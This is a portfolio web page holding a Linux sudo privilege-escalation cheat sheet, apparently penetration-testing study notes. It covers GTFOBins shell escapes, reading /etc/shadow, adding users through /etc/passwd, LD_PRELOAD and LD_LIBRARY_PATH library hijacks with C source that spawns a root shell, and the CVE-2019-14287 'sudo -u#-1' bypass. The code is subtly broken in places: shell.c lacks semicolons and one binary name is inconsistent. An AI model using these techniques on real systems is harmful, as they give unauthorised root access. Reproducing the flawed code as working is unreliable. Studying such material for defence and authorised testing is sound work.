<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <link rel="stylesheet" href="https://unicons.iconscout.com/release/v4.0.0/css/line.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">

    <link rel="stylesheet" href="../../../../../../assets/css/swiper-bundle.min.css">

    <!--==================== CSS ====================-->
    <link rel="stylesheet" href="../../../../../../assets/css/method-styles.css">

    <title>Methodology</title>
</head>
<body class="dark-theme">
    <!--==================== HEADER ====================-->
    <header class="header" id="header">
        <nav class="nav container">
            <a href="../../../../../index.html#home" class="nav__logo">Tyler O'Hare</a>
            <div class="nav__menu" id="nav-menu">
                <ul class="nav__list grid">
                    <li class="nav__item">
                        <a href="../../../../../index.html#home" class="nav__link">
                            <i class="uil uil-estate nav__icon"></i> Home
                        </a>
                    </li>
                    <li class="nav__item">
                        <a href="../../../../../index.html#skills" class="nav__link">
                            <i class="uil uil-file-alt nav__icon"></i> Skills
                        </a>
                    </li>
                    <li class="nav__item">
                        <a href="../../../../../index.html#portfolio" class="nav__link">
                            <i class="uil uil-scenery nav__icon"></i> Portfolio
                        </a>
                    </li>
                    <li class="nav__item">
                        <a href="../../../../../index.html#contact" class="nav__link">
                            <i class="uil uil-estate nav__icon"></i> Contact Me
                        </a>
                    </li>
                    <li class="nav__item">
                        <a href="../../../../../../assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449.html" class="nav__link active-link">
                            <i class="uil uil-estate nav__icon"></i> Methodology
                        </a>
                    </li>
                </ul>
                <i class="uil uil-times nav__close" id="nav-close"></i>
            </div>

            <div class="nav__btns">
                <!--Theme change button-->
                <i class="uil uil-moon change-theme" id="theme-button"></i>

                <div class="nav__toggle" id="nav-toggle">
                    <i class="uil uil-apps"></i>
                </div>
            </div>
        </nav>
    </header>
    <!--==================== END-HEADER ====================-->


<!--==================== MAIN ====================-->
    <main class="main"><article id="bd7f41e1-14eb-4a1d-943c-f4e7613af85d" class="page sans"><header><h1 class="page-title">Sudo Escalations</h1></header><div class="page-body"><h3 id="23982ea3-02d0-4e19-bbad-6acb49061928" class="">Sudo shell escapes:</h3><pre id="04b488d9-5d86-47af-9a54-a1f3178a4985" class="code code-wrap"><code>sudo -l
# look for NOPASSWD
</code></pre><p id="b1f34e14-a48f-4709-b026-cb884b78e270" class=""><a href="http://gtfobins.github.io/">gtfobins.github.io</a>:</p><ul id="7d78f209-b53a-4131-ac32-83ed919ad576" class="bulleted-list"><li style="list-style-type:disc">look up what we can do with sudo -l programs</li></ul><ul id="71cd86f0-a0d9-40ea-8e1a-e6dde8f32a80" class="bulleted-list"><li style="list-style-type:disc">Specifically look at Sudo section</li></ul><p id="a43506b3-1ce3-4cd0-ac8f-e2867aeb31db" class="">Intended Functionalities:</p><ul id="f7102fa1-5ebe-45fb-bc16-987df71e8a7e" class="bulleted-list"><li style="list-style-type:disc">sudo apache3 -f /etc/shadow</li></ul><ul id="42260458-f3f0-4486-9d4a-37ebc2052135" class="bulleted-list"><li style="list-style-type:disc">we can see shadow file from apache3</li></ul><p id="06a7e56e-e3cb-426b-9976-306e7d10414b" class="">
</p><p id="0f49791b-ae30-41d6-bd05-eff4cefd2a6e" class="">Edit /etc/passwd</p><pre id="31fd6984-e505-4a76-92e6-983fad3186b6" class="code"><code>openssl passwd mypass
add to /etc/shadow
add user in /etc/passwd
try to ssh</code></pre><h3 id="a49a2525-9d9c-464e-800f-5535b18b7281" class="">CVE Exploits</h3><pre id="8edbdb3e-24d1-4d2b-a542-c7cec17aa739" class="code"><code>sudo -V</code></pre><p id="e17dcf9c-d026-4b67-9a2f-76a0fb92289b" class=""><strong>LD-Preload:
</strong>sudo -l -&gt; you’ll see env_keep+=LD_PRELOAD</p><p id="e0b39bf0-0815-4f0e-b181-a89735ffb667" class="">Shell.c</p><pre id="b752fdf6-2593-47f3-b4e0-b968544bb8cf" class="code code-wrap"><code>#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;stdlib.h&gt;

void _init() {
unsetenv(&quot;LD_PRELOAD&quot;)
setgid(0);
setuid(0);
system(&quot;/bin/bash&quot;)

}

gcc -fPIC -shared -o shell.so shell.c
</code></pre><pre id="c4d33608-4f23-404c-8cb8-44ac286a2680" class="code code-wrap"><code>sudo LD_PRELOAD=/home/user/shell.so apache2</code></pre><p id="7a870968-1b03-471c-aa64-059ae04d8195" class="">
</p><p id="7fa5a422-c1f6-4c46-8458-2c994089ce79" class="">
</p><p id="940c0c44-695e-4c20-aef4-ba31afe122d3" class=""><strong>LD-Library Path:</strong></p><ul id="58af6636-b439-49aa-946e-d953c8334bbd" class="bulleted-list"><li style="list-style-type:disc">ldd /path/to/program</li></ul><ul id="043576d3-47ef-4a50-8e22-63816a12adf5" class="bulleted-list"><li style="list-style-type:disc">pick outputted library to replace</li></ul><pre id="3f04f3ee-a25b-4921-9d63-15bb3a2b3bfe" class="code"><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

static void hijack() __attribute__((constructor));

void hijack() {
	unsetenv(&quot;LD_LIBRARY_PATH&quot;);
	setresuid(0,0,0);
	system(&quot;/bin/bash -p&quot;);

}
gcc -fPIC -shared -o shell.so shell.c
sudo LD_LIBRARY_PATH=. /path/to/program
</code></pre><p id="7848fac1-60c9-4223-927e-1f3ed38fcdd6" class=""><strong>CVE-2019-14287</strong></p><p id="1d3c9aca-6475-4aa5-99df-01905268f8f6" class=""><a href="https://www.exploit-db.com/exploits/47502">https://www.exploit-db.com/exploits/47502</a></p><pre id="5139f7ab-619d-4ad7-91a1-652c7d2ec220" class="code"><code>sudo -u#-1 /bin/bash</code></pre><p id="c9774dc9-679d-4760-912d-e50bc7040956" class="">
</p><p id="d4fd5cfe-c9fc-4084-986d-2b4a73cc85e7" class=""><strong>CVE-2019-18634</strong></p><p id="549861ef-9da1-4d05-9292-048709be0ad1" class=""><a href="https://github.com/saleemrashid/sudo-cve-2019-18634">https://github.com/saleemrashid/sudo-cve-2019-18634</a></p><p id="65b010ca-c9ce-4bb2-9b30-f9df377b5e52" class="">
</p><p id="dad34acf-c250-4012-b64d-50c08f32e3dd" class="">vulnerability in pwfeedback → This is feedback **** when you enter a string in sudo password. Must be enabled.</p><pre id="e4473301-b6b7-4f91-8fb1-b324e78cd3fb" class="code"><code>#Check for sudo versions before 1.8.26
sudo -V </code></pre><p id="30a3627e-3cdf-4ca6-8827-9fc073c5b9bc" class="">
</p></div></article></main></main>

    <!--==================== FOOTER ====================-->
    <footer class="footer">
        <div class="footer__bg">
            <div class="footer__container container grid">
                <div>
                    <h1 class="footer__title">Tyler O'Hare</h1>
                    <span class="footer__subtitle">Cybersecurity Engineer</span>
                </div>

                <ul class="footer__links">
                    <li>
                        <a href="../../../../../index.html#skills" class="footer__link">Skills</a>
                    </li>

                    <li>
                        <a href="../../../../../index.html#portfolio" class="footer__link">Portfolio</a>
                    </li>

                    <li>
                        <a href="../../../../../../../index.html#contact" class="footer__link">Contact</a>
                    </li>
                    <li>
                        <a href="../../../../../../assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449.html" class="footer__link">Methodology</a>
                    </li>
                </ul>

                <div class="footer__socials">
                    <a href="https://github.com/tyohare" target="_blank" class="footer__social">
                        <i class="uil uil-github-alt"></i>
                    </a>

                    <a href="https://www.linkedin.com/in/tyler-ohare-72b26923a/" target="_blank" class="footer__social" class="footer__social">
                        <i class="uil uil-linkedin-alt"></i>
                    </a>
                </div>
            </div>

            <p class="footer__copy">&#169; Tyler O'Hare. All rights reserved.</p>
        </div>

    </footer>
    <!--==================== END-FOOTER ====================-->


    <!--==================== SCROLL TOP ====================-->
    <a href="" class="scrollup" id="scroll-up">
        <i class="uil uil-arrow-up scroll__icon"></i>
    </a>

    <!--==================== SWIPER JS ====================-->
    <script src="../../../../../../assets/js/swiper-bundle.min.js"></script>

    <!--==================== MAIN JS ====================-->
    <script src="../../../../../../assets/js/main.js"></script>
</body>
</html>